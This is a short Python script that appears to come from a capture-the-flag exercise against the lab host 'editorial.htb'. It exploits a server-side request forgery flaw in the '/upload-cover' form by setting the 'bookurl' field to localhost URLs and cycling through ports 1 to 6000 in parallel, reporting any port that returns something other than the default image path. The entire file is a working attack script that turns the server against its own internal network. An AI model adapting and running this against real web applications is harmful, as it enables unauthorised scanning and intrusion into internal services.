import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://editorial.htb/upload-cover"
boundary = "boundary_value"
expected_response = '/static/images/expected_image.jpeg'

def make_request(port):
    data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
        f'http://127.0.0.1:{port}/\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="bookfile"; filename=""\r\n'
        'Content-Type: application/octet-stream\r\n\r\n\r\n'
        f'--{boundary}--\r\n'
    )
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
    try:
        response = requests.post(url, data=data, headers=headers)
        if response.text != expected_response:
            print(f'Open port found: {port}')
    except requests.RequestException:
        pass

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(make_request, range(1, 6001))
